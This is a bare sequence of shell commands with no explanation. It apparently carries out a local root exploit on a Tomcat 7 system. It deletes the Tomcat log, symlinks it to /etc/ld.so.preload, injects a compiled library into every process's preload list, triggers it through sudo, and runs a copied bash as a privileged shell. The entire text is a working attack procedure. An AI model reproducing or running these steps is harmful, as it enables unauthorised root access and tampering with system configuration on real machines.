cp /bin/bash /tmp/tomcat7/rootsh
gcc -Wall -fPIC -shared -o ./own.so ./shared/own.c -ldl
rm /var/log/tomcat7/catalina.out
ln -s /etc/ld.so.preload /var/log/tomcat7/catalina.out
ps -aux
kill 38
echo /tmp/tomcat7/own.so > /etc/ld.so.preload
sudo --help
./rootsh -p